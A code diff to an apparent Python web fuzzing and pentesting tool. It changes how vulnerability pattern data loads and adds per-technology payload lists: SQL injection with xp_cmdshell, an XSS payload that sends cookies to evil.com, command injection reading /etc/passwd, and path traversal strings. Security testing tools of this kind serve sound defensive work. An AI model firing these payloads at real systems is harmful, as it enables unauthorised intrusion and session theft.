@@ -93,12 +93,29 @@ def _flatten_chain_entries(raw: Any) -> list[dict[str, Any]]:
     return [entry for entry in candidate if isinstance(entry, dict)]
 
 
-_patterns_file = Path(__file__).parent / "data" / "patterns.json"
-_zeroday_file = Path(__file__).parent / "data" / "zeroday_patterns.json"
+_patterns_file = Path(__file__).parent / "data" / "unified_patterns.json"
+_zeroday_file = Path(__file__).parent / "data" / "zeroday_patterns.json.bak"
 _attack_chain_file = Path(__file__).parent / "data" / "attack_chains.json"
 
-_EXPERT_PATTERNS: dict[str, dict[str, Any]] = _load_json_safely(_patterns_file, {})
-_ZERODAY_PATTERNS: dict[str, dict[str, Any]] = _load_json_safely(_zeroday_file, {})
+def _load_expert_patterns() -> dict[str, Any]:
+    """Load expert patterns from unified catalog."""
+    try:
+        from .data_loader import load_vuln_patterns
+        data = load_vuln_patterns()
+        return {k: v for k, v in data.items() if not k.startswith("_")}
+    except Exception:
+        return {}
+
+def _load_zeroday_patterns() -> dict[str, Any]:
+    """Load zeroday patterns from unified catalog (CRITICAL severity only)."""
+    try:
+        from .data_loader import load_zeroday_patterns
+        return load_zeroday_patterns()
+    except Exception:
+        return {}
+
+_EXPERT_PATTERNS: dict[str, dict[str, Any]] = _load_expert_patterns()
+_ZERODAY_PATTERNS: dict[str, dict[str, Any]] = _load_zeroday_patterns()
 _ATTACK_CHAIN_LIBRARY: list[dict[str, Any]] = _flatten_chain_entries(
     _load_json_safely(_attack_chain_file, [])
 )
@@ -314,13 +331,15 @@ class Fuzzer:
         return vuln_types
 
     async def _init_generative_fuzzing_if_enabled(self):
-        """Initialize generative fuzzing engine if enabled."""
+        """Initialize generative fuzzing engine.
+
+        Generative fuzzing is now enabled by default for all fuzzing operations.
+        The config gates are kept for backward compatibility but default to True.
+        """
         try:
             cfg = self._get_fuzzer_config()
-            if (
-                not cfg.intelligence_enabled
-                or not cfg.intelligence_generative_fuzzing_enabled
-            ):
+            # Generative fuzzing is now always enabled unless explicitly disabled
+            if not getattr(cfg, 'intelligence_generative_fuzzing_enabled', True):
                 return None
 
             from .agent.generative_fuzzing import GenerativeFuzzingEngine
@@ -374,7 +393,7 @@ class Fuzzer:
         if self._direct_client is None:
             self._direct_client = httpx.AsyncClient(
                 timeout=self.timeout,
-                verify=False,
+                verify=False,  # nosec B501 — intentional for pentesting
                 follow_redirects=True,
                 headers=self.headers,
             )
@@ -709,6 +728,69 @@ class Fuzzer:
             "signature": str(baseline.get("signature", "")),
         }
 
+    def _select_context_aware_payloads(
+        self,
+        vuln_type: str,
+        target_profile: Any,
+        param: str,
+        base_payloads: list[str],
+    ) -> list[str]:
+        """Select payloads based on target context.
+
+        Enhances static payload lists with context-aware filtering and augmentation:
+        - Technology stack (e.g., MySQL-specific payloads for MySQL)
+        - Input context (e.g., numeric payloads for number fields)
+        - Existing findings (e.g., if SQLi found, add RCE payloads)
+        """
+        if not target_profile:
+            return base_payloads
+
+        payloads = list(base_payloads)  # Start with base payloads
+
+        # Tech-specific payload augmentation
+        tech_names = [t.name.lower() for t in target_profile.technologies]
+
+        if vuln_type == "sql_injection":
+            if "mysql" in tech_names:
+                payloads.extend(["' OR 1=1-- ", "UNION SELECT NULL-- ", "WAITFOR DELAY '0:0:5'-- "])
+            elif "postgresql" in tech_names:
+                payloads.extend(["' OR 1=1-- ", "UNION SELECT NULL-- ", "pg_sleep(5)-- "])
+            elif "mssql" in tech_names or "sql server" in " ".join(tech_names):
+                payloads.extend(["' OR 1=1-- ", "UNION SELECT NULL-- ", "; EXEC xp_cmdshell('id')-- "])
+
+        elif vuln_type == "xss":
+            tech_str = " ".join(tech_names)
+            if any(fw in tech_str for fw in ("django", "rails", "express")):
+                # Modern frameworks often have CSP, try bypass techniques
+                payloads.extend([
+                    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
+                    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+                ])
+
+        elif vuln_type == "command_injection":
+            tech_str = " ".join(tech_names)
+            if "windows" in tech_str or "iis" in tech_str:
+                payloads.extend(["& dir", "| type C:\\Windows\\win.ini", "&& whoami"])
+            elif "nginx" in tech_names or "apache" in tech_names:
+                payloads.extend(["; cat /etc/passwd", "| id", "&& uname -a"])
+
+        elif vuln_type == "path_traversal":
+            tech_str = " ".join(tech_names)
+            if "windows" in tech_str or "iis" in tech_str:
+                payloads.extend(["..\\..\\..\\..\\Windows\\win.ini", "%2e%2e%5c%2e%2e%5c"])
+            elif "nginx" in tech_names:
+                payloads.extend(["..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"])
+
+        # Deduplicate while preserving order
+        seen = set()
+        unique_payloads = []
+        for p in payloads:
+            if p not in seen:
+                seen.add(p)
+                unique_payloads.append(p)
+
+        return unique_payloads
+
     async def fuzz_parameters(
         self,
         params: list[str],
@@ -770,7 +852,11 @@ class Fuzzer:
             else:
                 effective = priority_vuln_types or all_vuln_types
             for vt in effective:
-                payloads = FUZZ_PAYLOADS.get(vt, [])
+                base_payloads = FUZZ_PAYLOADS.get(vt, [])
+                # Apply context-aware payload selection
+                payloads = self._select_context_aware_payloads(
+                    vt, target_profile, param, base_payloads
+                )
                 if max_payloads_per_type > 0:
                     payloads = payloads[:max_payloads_per_type]
                 for payload in payloads:
@@ -2194,6 +2280,77 @@ class ExpertHeuristics:
 
         return list(dict.fromkeys(priority))
 
+    # ── Data-driven attack surface heuristics ─────────────────────────
+    # Loads ALL expert patterns, tech correlations, and business logic
+    # patterns from data files at module level. Detection is indicator-based —
+    # no hardcoded vulnerability types. New data files automatically surface.
+
+    _EXPERT_PATTERNS: dict[str, Any] = {}
+    _TECH_CORRELATIONS: dict[str, Any] = {}
+    _BUSINESS_LOGIC: dict[str, Any] = {}
+    _heuristic_patterns_compiled: list[tuple[re.Pattern, dict, str]] = []
+    _heuristic_tech_compiled: list[tuple[re.Pattern | str, dict]] = []
+    _heuristic_data_loaded: bool = False
+
+    @classmethod
+    def _load_heuristic_data(cls) -> None:
+        """Load all pattern data files once at runtime."""
+        if cls._heuristic_data_loaded:
+            return
+
+        from .data_loader import load_vuln_patterns
+
+        # Load unified pattern catalog (merged from patterns.json,
+        # business_logic_patterns.json, zeroday_patterns.json)
+        unified = load_vuln_patterns()
+        cls._EXPERT_PATTERNS = {
+            k: v for k, v in unified.items() if not k.startswith("_")
+        }
+
+        # Load technology correlations
+        data_dir = Path(__file__).parent / "data"
+        try:
+            cls._TECH_CORRELATIONS = json.loads(
+                (data_dir / "tech_correlations.json").read_text(encoding="utf-8")
+            )
+        except Exception as exc:
+            logger.debug("Could not load tech_correlations.json: %s", exc)
+
+        # Business logic patterns are now part of unified catalog
+        cls._BUSINESS_LOGIC = {
+            k: v for k, v in unified.items()
+            if not k.startswith("_") and any(
+                term in k.lower()
+                for term in ["business", "workflow", "checkout", "payment", "coupon", "subscription", "race", "loyalty"]
+            )
+        }
+        # Compile expert patterns into efficient matching tables
+        for pattern_name, pattern_data in cls._EXPERT_PATTERNS.items():
+            indicators = pattern_data.get("indicators", [])
+            if not indicators:
+                continue
+            regex_parts = [
+                re.escape(ind) for ind in sorted(indicators, key=len, reverse=True)
+            ]
+            compiled = re.compile(
+                rf"(?:{'|'.join(regex_parts)})", re.IGNORECASE
+            )
+            cls._heuristic_patterns_compiled.append(
+                (compiled, pattern_data, pattern_name)
+            )
+        # Compile tech correlations for header-based detection
+        for tech_name, tech_data in cls._TECH_CORRELATIONS.items():
+            tech_indicators: list[str] = []
+            tech_indicators.append(tech_name)
+            for path in tech_data.get("paths", []):
+                tech_indicators.append(path)
+            for ind in tech_indicators:
+                if ind:
+                    cls._heuristic_tech_compiled.append(
+                        (ind.lower(), tech_data)
+                    )
+        cls._heuristic_data_loaded = True
+
     @staticmethod
     def get_attack_surface_heuristics(
         url: str,
@@ -2205,149 +2362,163 @@ class ExpertHeuristics:
         resp_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
         req_lower = {k.lower(): v.lower() for k, v in request_headers.items()}
 
-        server = resp_lower.get("server", "")
-        powered_by = resp_lower.get("x-powered-by", "")
-        generator = resp_lower.get("x-generator", "")
-        auth_header = req_lower.get("authorization", "")
+        # Build unified scan context from all observable signals
+        scan_text = " ".join([
+            url.lower(),
+            " ".join(params.keys()).lower(),
+            " ".join(params.values()).lower(),
+            " ".join(resp_lower.values()),
+            " ".join(req_lower.values()),
+            resp_lower.get("server", ""),
+            resp_lower.get("x-powered-by", ""),
+            resp_lower.get("x-generator", ""),
+            req_lower.get("authorization", ""),
+        ])
 
-        if "php" in powered_by or ".php" in url:
-            guidance.append(
-                ExpertGuidance(
-                    recommendation="Test PHP-specific vulnerabilities: type juggling, LFI, XXE",
-                    reason="PHP detected via X-Powered-By or URL extension",
-                    priority="high",
-                    tools_suggested=["ffuf -e .php", "wfuzz", "curl with XXE payload"],
-                    confidence=0.85,
-                )
-            )
+        # ── Phase 1: Match against expert patterns (36 patterns) ──
+        matched_patterns: set[str] = set()
+        for compiled, pdata, pname in Fuzzer._heuristic_patterns_compiled:
+            if compiled.search(scan_text):
+                matched_patterns.add(pname)
+                vuln_desc = pdata.get("description", pname)
+                actions = pdata.get("suggested_actions", [])
+                severity = pdata.get("severity", "MEDIUM").lower()
+                top_action = actions[0] if actions else vuln_desc
 
-        if "wordpress" in generator or "/wp-" in url:
-            guidance.append(
-                ExpertGuidance(
-                    recommendation="Run wpscan; check xmlrpc.php, wp-login.php brute force",
-                    reason="WordPress detected",
-                    priority="high",
-                    tools_suggested=["wpscan", "curl /xmlrpc.php"],
-                    confidence=0.9,
-                )
-            )
+                guidance.append(ExpertGuidance(
+                    recommendation=top_action,
+                    reason=f"[{pname}] {vuln_desc}",
+                    priority=severity,
+                    tools_suggested=[],
+                    confidence=0.7 + (0.05 if severity == "critical" else
+                                     0.03 if severity == "high" else 0.0),
+                ))
+                # Include additional actions as separate guidance entries
+                for action in actions[1:]:
+                    guidance.append(ExpertGuidance(
+                        recommendation=action,
+                        reason=f"[{pname}] Additional test vector",
+                        priority=severity,
+                        tools_suggested=[],
+                        confidence=0.55,
+                    ))
 
-        if "apache" in server:
-            guidance.append(
-                ExpertGuidance(
-                    recommendation="Test Apache path traversal, .htaccess disclosure, mod_status",
-                    reason="Apache detected in Server header",
-                    priority="medium",
-                    tools_suggested=["curl /server-status", "nikto"],
-                    confidence=0.7,
-                )
-            )
+        # ── Phase 2: Match against tech correlations (header-based) ──
+        # Detect technologies from Server header, X-Powered-By, X-Generator
+        # and URL paths
+        for indicator, tdata in Fuzzer._heuristic_tech_compiled:
+            detected = False
+            if indicator in scan_text:
+                detected = True
+            # Also check Server header for server names
+            server_hdr = resp_lower.get("server", "")
+            if indicator in server_hdr:
+                detected = True
+            # Check X-Powered-By for frameworks
+            powered = resp_lower.get("x-powered-by", "")
+            if indicator in powered:
+                detected = True
 
-        if "nginx" in server:
-            guidance.append(
-                ExpertGuidance(
-                    recommendation="Test nginx alias traversal and off-by-slash misconfiguration",
-                    reason="Nginx detected in Server header",
-                    priority="medium",
-                    tools_suggested=["curl /static../etc/passwd", "nuclei -t nginx"],
-                    confidence=0.7,
-                )
-            )
+            if detected:
+                tech_key = next(
+                    (k for k, v in Fuzzer._TECH_CORRELATIONS.items() if v is tdata),
+                    "unknown"
+                ).upper()
+                vulns = tdata.get("vulns", [])
+                tools = tdata.get("tools", [])
 
-        if auth_header.startswith("bearer ") and auth_header.count(".") == 2:
-            guidance.append(
-                ExpertGuidance(
-                    recommendation="Test JWT: alg:none, weak HMAC secret, kid injection",
-                    reason="JWT Bearer token detected in Authorization header",
-                    priority="high",
-                    tools_suggested=["jwt_tool", "hashcat -m 16500"],
-                    confidence=0.8,
-                )
-            )
+                if vulns:
+                    top_vuln = vulns[0]
+                    guidance.append(ExpertGuidance(
+                        recommendation=(
+                            f"Audit for known {tech_key} vulnerabilities: "
+                            f"{top_vuln}"
+                        ),
+                        reason=f"Technology detected: {tech_key} via {indicator}",
+                        priority="medium",
+                        tools_suggested=list(tools)[:3],
+                        confidence=0.75 if tools else 0.65,
+                    ))
+                    for v in vulns[1:3]:
+                        guidance.append(ExpertGuidance(
+                            recommendation=f"Check: {v}",
+                            reason=f"{tech_key} additional vulnerability surface",
+                            priority="medium",
+                            tools_suggested=[],
+                            confidence=0.5,
+                        ))
 
-        if "graphql" in url or "gql" in url:
-            guidance.append(
-                ExpertGuidance(
-                    recommendation="Test GraphQL: introspection, batching DoS, IDOR via IDs",
-                    reason="GraphQL endpoint detected",
-                    priority="high",
-                    tools_suggested=["graphqlmap", "clairvoyance"],
-                    confidence=0.85,
-                )
-            )
+        # ── Phase 3: Business logic patterns (8 patterns) ──
+        for bl_name, bl_data in Fuzzer._BUSINESS_LOGIC.items():
+            indicators = bl_data.get("indicators", [])
+            if any(ind.lower() in scan_text for ind in indicators):
+                bl_desc = bl_data.get("description", bl_name)
+                actions = bl_data.get("suggested_actions", [])
+                severity = bl_data.get("severity", "MEDIUM").lower()
 
-        for k, v in params.items():
-            if v.isdigit() and k.lower() in ("id", "user_id", "account_id", "order_id"):
-                guidance.append(
-                    ExpertGuidance(
-                        recommendation=f"Test IDOR on parameter '{k}' — try adjacent IDs and negative values",
-                        reason=f"Numeric ID parameter detected: {k}={v}",
-                        priority="high",
-                        tools_suggested=["burp intruder", "ffuf -w ids.txt"],
-                        confidence=0.75,
-                    )
-                )
-                break
+                for action in actions[:2]:
+                    guidance.append(ExpertGuidance(
+                        recommendation=action,
+                        reason=f"[{bl_name}] {bl_desc}",
+                        priority=severity,
+                        tools_suggested=[],
+                        confidence=0.7 if severity in ("critical", "high") else 0.55,
+                    ))
 
         return guidance
 
-    @staticmethod
-    def suggest_next_tests(vuln_type: str) -> list[str]:
-        suggestions: dict[str, list[str]] = {
-            "sql_injection": [
-                "Try UNION-based extraction: ' UNION SELECT table_name FROM information_schema.tables--",
-                "Test time-based blind: ' AND SLEEP(5)--",
-                "Attempt INTO OUTFILE for webshell upload",
-                "Test for second-order SQL injection in profile/update flows",
-                "Use sqlmap --dbs for automated enumeration",
-            ],
-            "xss": [
-                "Test stored XSS in all input fields",
-                "Test DOM-based XSS via URL fragment (#)",
-                "Try CSP bypass: base64, data URI, JSONP",
-                "Attempt session hijacking via document.cookie exfil",
-                "Test XSS in HTTP headers: User-Agent, Referer",
-            ],
-            "idor": [
-                "Test horizontal privilege escalation (other users' data)",
-                "Test vertical privilege escalation (admin functions)",
-                "Try parameter pollution: id=1&id=2",
-                "Test IDOR in file download/upload endpoints",
-                "Check UUID predictability if UUIDs used",
-            ],
-            "ssti": [
-                "Identify template engine: Jinja2/Twig/Freemarker",
-                "Attempt RCE via config/os.popen",
-                "Extract environment variables and secrets",
-                "Try sandbox escape techniques",
-            ],
-            "path_traversal": [
-                "Read /etc/passwd, /etc/shadow, /proc/self/environ",
-                "Read application source and config files",
-                "Test log poisoning for RCE",
-                "Try absolute path injection: /etc/passwd",
-            ],
-            "xxe": [
-                "Read internal files via SYSTEM entity",
-                "Test SSRF via external DTD",
-                "Attempt blind XXE with out-of-band DNS callback",
-                "Try error-based XXE for file content extraction",
-            ],
-            "command_injection": [
-                "Confirm RCE with: id; whoami; hostname",
-                "Attempt reverse shell",
-                "Enumerate internal network",
-                "Check for sudo permissions",
-            ],
-        }
-        return suggestions.get(
-            vuln_type,
-            [
-                f"Enumerate further with {vuln_type}-specific payloads",
-                "Check other endpoints for same vulnerability class",
-                "Test in different HTTP methods (GET→POST→PUT)",
-            ],
-        )
+    @classmethod
+    def _build_vuln_suggestions_from_patterns(cls, vuln_type: str) -> list[str]:
+        """Generate testing suggestions dynamically from data files.
+
+        Falls back to patterns.json expert patterns, business logic patterns,
+        and tech correlations — all driven by the vuln_type keyword.
+        """
+        suggestions: list[str] = []
+
+        # 1. Look up matching expert patterns by indicator overlap
+        for pname, pdata in cls._EXPERT_PATTERNS.items():
+            if vuln_type.replace("_", "") in pname.replace("_", "").lower():
+                for action in pdata.get("suggested_actions", []):
+                    if action not in suggestions:
+                        suggestions.append(action)
+            indicators = pdata.get("indicators", [])
+            if any(
+                ind.lower().replace("_", "") in vuln_type.lower()
+                for ind in indicators
+            ):
+                for action in pdata.get("suggested_actions", []):
+                    if action not in suggestions:
+                        suggestions.append(action)
+
+        # 2. Look up matching business logic patterns
+        for bl_name, bl_data in cls._BUSINESS_LOGIC.items():
+            if vuln_type.replace("_", "") in bl_name.replace("_", "").lower():
+                for action in bl_data.get("suggested_actions", []):
+                    if action not in suggestions:
+                        suggestions.append(action)
+
+        # 3. Look up matching tech correlations (known vulns for a tech)
+        for tech_name, tdata in cls._TECH_CORRELATIONS.items():
+            if tech_name in vuln_type.lower():
+                for vuln in tdata.get("vulns", []):
+                    if vuln not in suggestions:
+                        suggestions.append(vuln)
+
+        # 4. If no pattern matched, provide generic exploration guidance
+        suggestions.extend([
+            f"Test {vuln_type} with alternative payloads from "
+            f"waf_bypass and exploit strategy data files",
+            "Check other endpoints for same vulnerability class",
+            "Test with different HTTP methods and content types",
+        ])
+
+        return suggestions
+
+    @classmethod
+    def suggest_next_tests(cls, vuln_type: str) -> list[str]:
+        cls._load_heuristic_data()
+        return cls._build_vuln_suggestions_from_patterns(vuln_type)
 
 
 class ExploitChainEngine:
@@ -2355,6 +2526,15 @@ class ExploitChainEngine:
         self.fuzzer = fuzzer
         self.discovered_chains: list[ExploitChain] = []
         self._special_probe_cache: dict[str, list[FuzzResult]] = {}
+
+    _INJECTION_FAMILY: frozenset[str] = frozenset({
+        "sql_injection", "xss", "ssti", "command_injection",
+        "xxe", "path_traversal", "code_injection", "template_injection",
+    })
+    _PROXY_FAMILY: frozenset[str] = frozenset({
+        "open_redirect", "ssrf", "graphql", "xss",
+        "http_smuggling", "cache_poisoning",
+    })
 
     async def discover_chains(
         self,
@@ -2365,14 +2545,9 @@ class ExploitChainEngine:
         for finding in initial_findings:
             follow_ons = list(CHAIN_RULES.get(finding.vuln_type, []))
 
-            if finding.vuln_type in {
-                "sql_injection",
-                "xss",
-                "ssti",
-                "command_injection",
-            }:
+            if finding.vuln_type in self._INJECTION_FAMILY:
                 follow_ons.append("second_order_injection")
-            if finding.vuln_type in {"open_redirect", "ssrf", "graphql", "xss"}:
+            if finding.vuln_type in self._PROXY_FAMILY:
                 follow_ons.append("http_desync_cache")
             follow_ons = list(dict.fromkeys(follow_ons))
             if not follow_ons:
